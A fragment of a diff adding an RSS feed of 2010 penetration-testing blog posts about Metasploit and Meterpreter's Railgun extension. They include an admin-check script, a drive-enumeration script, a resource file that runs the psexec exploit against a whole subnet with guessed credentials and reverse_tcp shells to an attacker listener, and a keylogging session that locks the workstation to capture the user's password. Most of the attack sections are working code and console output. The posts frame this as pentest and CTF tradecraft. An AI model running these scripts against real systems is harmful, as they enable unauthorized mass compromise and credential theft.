+&lt;p&gt;[youtube &lt;a href=&#34;http://www.youtube.com/watch?v=tkoApCp8rQ4&amp;amp;hl=en&amp;amp;fs=1&#34;&gt;http://www.youtube.com/watch?v=tkoApCp8rQ4&amp;amp;hl=en&amp;amp;fs=1&lt;/a&gt;]&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Am I an Admin? Railgun Script</title>
+      <link>http://localhost:1313/post/2010/2010913am-i-an-admin-railgun-script-html/</link>
+      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/2010913am-i-an-admin-railgun-script-html/</guid>
+      <description>&lt;p&gt;When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.&lt;/p&gt;
+
+&lt;p&gt;But, I wanted to make a way that check a bunch of sessions all at once. So I wrote &amp;ldquo;AmIAdmin.rb&amp;rdquo; which uses meterpreter&amp;rsquo;s railgun extension to execute &amp;ldquo;IsUserAdmin&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;Being that Shell32.dll isn&amp;rsquo;t included in railgun by default we have to add it. After writing it I decided to add some checks. These checks make sure that each piece of the script isn&amp;rsquo;t already loaded. It&amp;rsquo;s a good reference for doing this in the future.&lt;/p&gt;
+
+&lt;p&gt;(you can remove the print_status lines if you want the script to be quieter)&lt;/p&gt;
+
+&lt;p&gt;Here is the script for your consumption:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;if client.platform == &amp;ldquo;x64/win32&amp;rdquo;&lt;br /&gt;
+print_status &amp;ldquo;Railgun is currently not supported for x64 bit systems&amp;rdquo;&lt;br /&gt;
+raise Rex::Script::Completed&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;if client.railgun.present? == true&lt;br /&gt;
+print_status &amp;ldquo;Railgun already loaded.. skipping&amp;rdquo;&lt;br /&gt;
+else&lt;br /&gt;
+print_status &amp;ldquo;Loading Railgun&amp;rdquo;&lt;br /&gt;
+client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;if client.railgun.dll[&amp;lsquo;shell32&amp;rsquo;] == nil&lt;br /&gt;
+print_status &amp;ldquo;Adding Shell32.dll&amp;rdquo;&lt;br /&gt;
+client.railgun.add_dll(&amp;lsquo;shell32&amp;rsquo;,&amp;lsquo;shell32&amp;rsquo;)&lt;br /&gt;
+else&lt;br /&gt;
+print_status &amp;ldquo;Shell32 already loaded.. skipping&amp;rdquo;&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;if (client.railgun.shell32.functions[&amp;lsquo;IsUserAnAdmin&amp;rsquo;] == nil&lt;br /&gt;
+print_status &amp;ldquo;Adding the IsUserAnAdmin function&amp;rdquo;&lt;br /&gt;
+client.railgun.add_function(&amp;lsquo;shell32&amp;rsquo;, &amp;lsquo;IsUserAnAdmin&amp;rsquo;, &amp;lsquo;BOOL&amp;rsquo;, [])&lt;br /&gt;
+else&lt;br /&gt;
+print_status &amp;ldquo;IsUserAnAdmin already loaded.. skipping&amp;rdquo;&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;print_status &amp;ldquo;Running the IsUserAnAdmin function&amp;rdquo;&lt;br /&gt;
+status = client.railgun.shell32.IsUserAnAdmin()&lt;/p&gt;
+
+&lt;p&gt;if status[&amp;ldquo;return&amp;rdquo;] == true then&lt;br /&gt;
+print_status &amp;ldquo;You are an administrator&amp;rdquo;&lt;br /&gt;
+else&lt;br /&gt;
+print_error &amp;ldquo;You are not an administrator&amp;rdquo;&lt;br /&gt;
+end&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Rapid fire PSEXEC for Metasploit</title>
+      <link>http://localhost:1313/post/2010/2010912rapid-fire-psexec-for-metasploit-html/</link>
+      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/2010912rapid-fire-psexec-for-metasploit-html/</guid>
+      <description>&lt;p&gt;Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.&lt;/p&gt;
+
+&lt;p&gt;// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections. Also take note of the &amp;ldquo;setg&amp;rdquo; which sets the variable globally so that I don&amp;rsquo;t have to set it inside of the psexec module.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;use multi/handler&lt;br /&gt;
+setg PAYLOAD windows/meterpreter/reverse_tcp&lt;br /&gt;
+setg LHOST 192.168.1.114&lt;br /&gt;
+setg LPORT 80&lt;br /&gt;
+set ExitOnSession false&lt;/p&gt;
+
+&lt;p&gt;exploit -j -z&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&amp;rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;use windows/smb/psexec&lt;br /&gt;
+set SMBUser Administrator&lt;br /&gt;
+set SMBPass password123&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&amp;rsquo;t joined to a domain they can take pretty much anything here.&lt;/p&gt;
+
+&lt;p&gt;However if they are actually joined to a domain, you either have to have the computer name (which definitely won&amp;rsquo;t play well with a scanner easily) or use domain credentials.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;set SMBDomain .&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The &amp;ldquo;.&amp;rdquo; is something every Windows API programmer would know as it&amp;rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&amp;rsquo;t take either localhost or 127.0.0.1.&lt;/p&gt;
+
+&lt;p&gt;Next up, we don&amp;rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&amp;rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;set DisablePayloadHandler true&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the &lt;ruby&gt; html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&amp;rsquo;s API) to do really cool stuff.&lt;/p&gt;
+
+&lt;p&gt;More setup, but this time for the ruby portion. Using Metasploit&amp;rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &amp;ldquo;file:&amp;rdquo; prefix.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;ruby&gt;&lt;br /&gt;
+require &amp;lsquo;rex/socket/range_walker&amp;rsquo;&lt;br /&gt;
+rhosts = &amp;ldquo;192.168.92.0/24&amp;rdquo;&lt;br /&gt;
+iplist = Rex::Socket::RangeWalker.new(rhosts)&lt;br /&gt;
+iplist.each do |rhost|&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So, we&amp;rsquo;ve included RangeWalker, parsed it, and loaded it into an &amp;lsquo;each&amp;rsquo; for loop.&lt;/p&gt;
+
+&lt;p&gt;The &amp;ldquo;self.run_single&amp;rdquo; function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;self.run_single(&amp;ldquo;set RHOST #{rhost}&amp;rdquo;)&lt;br /&gt;
+self.run_single(&amp;ldquo;exploit -j -z&amp;rdquo;)&lt;/p&gt;
+
+&lt;p&gt;end&lt;br /&gt;
+&lt;/ruby&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;That&amp;rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &amp;ldquo;-z -j&amp;rdquo; just as we did with multi/handler.&lt;/p&gt;
+
+&lt;p&gt;Now, if your credentials worked on any of the IPs you&amp;rsquo;ll have sessions waiting for you.&lt;/p&gt;
+
+&lt;p&gt;This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.&lt;/p&gt;
+
+&lt;p&gt;Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Intro to RailGun: WIN API for Meterpreter</title>
+      <link>http://localhost:1313/post/2010/201077intro-to-railgun-win-api-for-meterpreter-html/</link>
+      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/201077intro-to-railgun-win-api-for-meterpreter-html/</guid>
+      <description>
+
+&lt;p&gt;Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&#34;&gt;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&#34;&gt;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;iphlpapi&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;ws2_32&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;kernel32&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;ntdll&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;user32&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;advapi32&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;(You can find out exactly what functions are available by default in the api.rb file)&lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s also very extensible, it doesn&amp;rsquo;t have a DLL or function you need? But you can read all about in the manual:&lt;/p&gt;
+
+&lt;p&gt;./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf&lt;/p&gt;
+
+&lt;p&gt;Here are two examples where this comes in very handy:&lt;/p&gt;
+
+&lt;h2 id=&#34;list-drives:1be7096449894c4f067b69b2d2c6d183&#34;&gt;List Drives:&lt;/h2&gt;
+
+&lt;p&gt;The problem that I&amp;rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;net use - Shows you what Network drives are connected, but not physical ones&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;fsutil fsinfo drives - You must be an administrator to ride this train&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;fdisk /status - Only on OLD versions of DOS, not sure when this disappeared&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But railgun solves this problem with a really short script:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;h1 id=&#34;load-the-railgun-plugin-update-you-no-longer-need-this-step:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Load the Railgun plugin  &lt;strong&gt;&lt;em&gt;Update: You no longer need this step&lt;/em&gt;&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;/p&gt;
+
+&lt;h1 id=&#34;make-the-api-call-to-enum-drive-letters:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Make the API call to enum drive letters&lt;/h1&gt;
+
+&lt;p&gt;a = client.railgun.kernel32.GetLogicalDrives()[&amp;ldquo;return&amp;rdquo;]&lt;/p&gt;
+
+&lt;h1 id=&#34;math-magic-to-convert-the-binary-to-letters:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Math magic to convert the binary to letters&lt;/h1&gt;
+
+&lt;p&gt;drives = []&lt;br /&gt;
+letters = &amp;ldquo;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;rdquo;&lt;br /&gt;
+(0..25).each do |i|&lt;br /&gt;
+test = letters[i,1]&lt;br /&gt;
+rem = a % (2**(i+1))&lt;br /&gt;
+if rem &amp;gt; 0&lt;br /&gt;
+drives &amp;lt;&amp;lt; test&lt;br /&gt;
+a = a - rem&lt;br /&gt;
+end&lt;br /&gt;
+end&lt;br /&gt;
+print_line(&amp;ldquo;Drives Available = #{drives.inspect}&amp;rdquo;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Output:&lt;br /&gt;
+Drives Available = [&amp;ldquo;A&amp;rdquo;, &amp;ldquo;C&amp;rdquo;, &amp;ldquo;D&amp;rdquo;, &amp;ldquo;P&amp;rdquo;, &amp;ldquo;X&amp;rdquo;]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Save this as a meterpreter script and it&amp;rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).&lt;/p&gt;
+
+&lt;p&gt;Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…&lt;/p&gt;
+
+&lt;h2 id=&#34;jedi-keylogging:1be7096449894c4f067b69b2d2c6d183&#34;&gt;JEDI KEYLOGGING:&lt;/h2&gt;
+
+&lt;p&gt;One of the problems with keylogging is you never know when that person will log in, and if you&amp;rsquo;re using a client side, they have probably already logged in and you&amp;rsquo;re hoping they log into a portal or some other password protected site.&lt;/p&gt;
+
+&lt;p&gt;Railgun to the rescue again:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon&lt;/strong&gt;&lt;br /&gt;
+meterpreter &amp;gt; bgrun keylogrecorder -c 1 -t 15&lt;br /&gt;
+[&lt;em&gt;] Executed Meterpreter with Job ID 0&lt;br /&gt;
+meterpreter &amp;gt; [&lt;/em&gt;] winlogon.exe Process found, migrating into 640&lt;br /&gt;
+[&lt;em&gt;] Migration Successful!!&lt;br /&gt;
+[&lt;/em&gt;] Starting the keystroke sniffer&amp;hellip;&lt;br /&gt;
+[&lt;em&gt;] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt&lt;br /&gt;
+[&lt;/em&gt;] Recording&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.&lt;/strong&gt;
+&amp;gt;
+&amp;gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; irb&lt;br /&gt;
+[&lt;em&gt;] Starting IRB shell&lt;br /&gt;
+[&lt;/em&gt;] The &amp;lsquo;client&amp;rsquo; variable holds the meterpreter client&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;br /&gt;
+=&amp;gt; true&lt;br /&gt;
+client.railgun.user32.LockWorkStation()&lt;br /&gt;
+=&amp;gt; {&amp;ldquo;GetLastError&amp;rdquo;=&amp;gt;0, &amp;ldquo;return&amp;rdquo;=&amp;gt;true}&lt;br /&gt;
+exit&lt;br /&gt;
+meterpreter &amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Set up &amp;ldquo;tail -f&amp;rdquo; going on the log file for the keylogger and then kill the keylogger when you&amp;rsquo;ve gotten what you came for.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; bglist&lt;br /&gt;
+[&lt;em&gt;] Job 0: [&amp;ldquo;keylogrecorder&amp;rdquo;, &amp;ldquo;-c&amp;rdquo;, &amp;ldquo;1&amp;rdquo;, &amp;ldquo;-t&amp;rdquo;, &amp;ldquo;15&amp;rdquo;]&lt;br /&gt;
+meterpreter &amp;gt; bgkill 0&lt;br /&gt;
+[&lt;/em&gt;] Killing background job 0&amp;hellip;&lt;br /&gt;
+meterpreter &amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Hope you have fun with railgun and shoot me an email &lt;a href=&#34;mailto:mubix@hak5.org&#34;&gt;mubix@hak5.org&lt;/a&gt; or leave a comment if you have any other crazy uses for railgun.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
